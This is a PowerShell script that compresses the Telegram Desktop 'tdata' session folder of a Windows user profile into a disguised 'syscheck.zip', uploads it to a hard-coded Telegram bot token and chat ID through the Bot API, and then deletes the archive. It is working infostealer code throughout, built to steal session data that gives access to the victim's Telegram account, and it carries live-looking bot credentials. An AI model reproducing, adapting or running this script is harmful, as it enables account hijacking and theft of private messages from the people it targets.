# Define your variables
$zipPath = "$env:TEMP\syscheck.zip" # Update this path
$tdataPath = "C:\Users\M Y T H I C A L\AppData\Roaming\Telegram Desktop\tdata" # Update if needed
$maxRetries = 5
$delaySeconds = 5
$botToken = "8853091711:AAHXtKxyYTa91Xn0_Lgb4QXj0481ZRspQ4M" # Replace with your bot token
$chatId = "8699240431"     # Replace with your chat ID

# Function to compress directory with retries
function Compress-DirectoryWithRetries {
    param (
        [string] $SourcePath,
        [string] $DestinationPath,
        [int] $Retries = 5,
        [int] $DelaySeconds = 5
    )

    for ($i=0; $i -lt $Retries; $i++) {
        try {
            # Remove existing ZIP if it exists
            if (Test-Path $DestinationPath) {
                Remove-Item $DestinationPath -Force
            }

            # Compress directory
            Compress-Archive -Path $SourcePath -DestinationPath $DestinationPath -Force
            Write-Output "Compression succeeded."
            return $true
        } catch {
            Write-Warning "Attempt $($i+1): Compression failed. Error: $_"
            Start-Sleep -Seconds $DelaySeconds
        }
    }
    return $false
}

# Attempt compression
$compressionResult = Compress-DirectoryWithRetries -SourcePath $tdataPath -DestinationPath $zipPath -Retries $maxRetries -DelaySeconds $delaySeconds

if (-not $compressionResult) {
    Write-Warning "Failed to compress directory after multiple attempts."
    exit
}

# Verify ZIP exists
if (-not (Test-Path $zipPath)) {
    Write-Warning "ZIP file was not created. Exiting."
    exit
}

# Function to send ZIP file via Telegram using multipart/form-data
function Send-FileToTelegram {
    param (
        [string] $FilePath,
        [string] $Token,
        [string] $ChatId
    )

    try {
        # Prepare the request
        $webRequest = [System.Net.HttpWebRequest]::Create("https://api.telegram.org/bot$Token/sendDocument")
        $webRequest.Method = "POST"

        # Generate boundary
        $boundary = "-----------------------------" + [System.Guid]::NewGuid().ToString()
        $webRequest.ContentType = "multipart/form-data; boundary=$boundary"

        # Read file bytes
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileName = [System.IO.Path]::GetFileName($FilePath)

        # Build multipart form data
        $sb = New-Object System.Text.StringBuilder

        # Add chat_id
        $sb.AppendLine("--$boundary")
        $sb.AppendLine('Content-Disposition: form-data; name="chat_id"')
        $sb.AppendLine()
        $sb.AppendLine($ChatId)

        # Add document file
        $sb.AppendLine("--$boundary")
        $sb.AppendLine('Content-Disposition: form-data; name="document"; filename="' + $fileName + '"')
        $sb.AppendLine("Content-Type: application/octet-stream")
        $sb.AppendLine()

        $formHeader = [Text.Encoding]::UTF8.GetBytes($sb.ToString())
        $footer = [Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")

        # Calculate total length
        $contentLength = $formHeader.Length + $fileBytes.Length + $footer.Length
        $webRequest.ContentLength = $contentLength

        # Write data to request stream
        $stream = $webRequest.GetRequestStream()
        $stream.Write($formHeader, 0, $formHeader.Length)
        $stream.Write($fileBytes, 0, $fileBytes.Length)
        $stream.Write($footer, 0, $footer.Length)
        $stream.Close()

        # Get response
        $response = $webRequest.GetResponse()
        $responseStream = $response.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($responseStream)
        $responseText = $reader.ReadToEnd()
        Write-Output "File sent successfully. Response: $responseText"
        $reader.Close()
        $response.Close()
        return $true
    } catch {
        Write-Error "Failed to send file: $_"
        return $false
    }
}

# Send the ZIP file
$sendResult = Send-FileToTelegram -FilePath $zipPath -Token $botToken -ChatId $chatId

# Cleanup: delete ZIP file if sent successfully
if ($sendResult) {
    try {
        Remove-Item $zipPath -Force
        Write-Output "Cleaned up ZIP file."
    } catch {
        Write-Warning "Failed to delete ZIP file: $_"
    }
} else {
    Write-Warning "File was not sent, skipping deletion."
}
